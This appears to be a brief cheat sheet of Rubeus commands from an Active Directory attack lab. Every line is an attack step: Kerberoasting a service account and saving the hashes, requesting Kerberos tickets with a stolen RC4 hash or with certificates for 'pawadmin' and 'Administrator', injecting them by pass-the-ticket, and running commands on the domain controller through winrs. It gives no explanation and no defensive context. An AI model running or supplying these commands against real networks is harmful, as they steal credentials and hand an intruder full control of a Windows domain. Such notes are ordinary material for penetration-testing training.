### Rubeus
```
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
```
Rubeus.exe asktgt /user:pawadmin$ /rc4:<> /ptt
Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
Rubeus.exe ptt /ticket:TGTofUS-DC$
winrs -r:us-dc whoami
```
